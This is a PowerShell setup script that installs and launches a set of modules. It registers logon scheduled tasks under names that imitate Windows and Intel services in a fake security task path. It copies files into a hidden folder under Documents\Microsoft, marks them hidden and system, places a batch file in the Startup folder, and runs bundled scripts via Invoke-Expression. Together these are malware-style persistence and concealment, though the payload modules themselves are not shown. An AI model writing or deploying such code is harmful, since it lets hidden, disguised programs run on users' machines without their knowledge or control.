# Paths & Settings
$location = Get-Location
$scripts = "${location}\scripts"
$_sourcePathSystem = "${location}\system"
$_sourcePathLocal = "${location}\local"
$_destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
$_resourcesPath = "${location}\extra"
# Script Settings moved to "conf.ps1" located in Module Folder

# Load Module Names/Paths
$modulesLocal = Get-ChildItem -Path $_sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty Name
$modulesSystem = Get-ChildItem -Path $_sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name


# Export Variables to Modules
function exportVars {
    [string]$FilePath = "vars.txt"
    $variables = Get-Variable
    $exclamationVariables = $variables | Where-Object { $_.Name -like '_*' }
    foreach ($var in $exclamationVariables) {
        $output += "`$" + "$($var.Name) = $($var.Value)" + "`n"
    }
    $output | Out-File -FilePath $FilePath
}

# Unblock Files
Get-ChildItem -r | unblock-file

# Register Scheduled Tasks
$trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
$names = ("SecurityScan", "ScanHelper", "WinDiagnostics", "MicrosoftService", "SSDCleaner", "PerformanceOptimizer", "IntelPowerUtility")
$num = 0
# Local
foreach ($i in $modulesLocal) { 
    if (Test-Path "${_sourcePathLocal}\${i}\conf.ps1") {
        $exp = Get-Content -Path "${_sourcePathLocal}\${i}\conf.ps1" -Raw; Invoke-Expression $exp;
        if ($autoRun -eq $true) {
            $PS = New-ScheduledTaskAction -Execute "${_sourcePathLocal}\${i}\RUN-Module.bat"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS
            $autoRun = $false
            $num++
        }
    }
}
# System
foreach ($i in $modulesSystem) { 
    if (Test-Path "${_sourcePathSystem}\${i}\conf.ps1") {
        $exp = Get-Content -Path "${_sourcePathSystem}\${i}\conf.ps1" -Raw; Invoke-Expression $exp;
        if ($autoRun -eq $true) {
            $PS = New-ScheduledTaskAction -Execute "${_destinationPath}\${i}\RUN-Module.bat"
            Register-ScheduledTask -TaskName $names[$num] -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS
            $autoRun = $false
            $num++
        }
    }
}

# Copy to System
Robocopy "${_sourcePathSystem}" "${_destinationPath}" /A+:SH /MIR /MT

# Hide
Get-ChildItem -r "${_destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }

# Run Batch Scripts (.bat)
$scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsBatch) { if ($i.EndsWith('.bat')) { Start-Process $i } }

# Run Powershell Scripts (.ps1)
$scriptsPowershell = Get-ChildItem -Path "${scripts}\powershell" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsPowershell) { if ($i.EndsWith('.ps1')) { $exp = Get-Content -Path $i -Raw; Invoke-Expression $exp; Set-Location $location } }

# Move to shell:startup
Move-Item "${_destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# Run local Modules
foreach ($i in $modulesLocal) { Set-Location "${_sourcePathLocal}\${i}"; exportVars; Start-Process .\RUN-Module.bat }

# Run System Modules
foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}\${i}"; exportVars; Start-Process .\RUN-Module.bat }
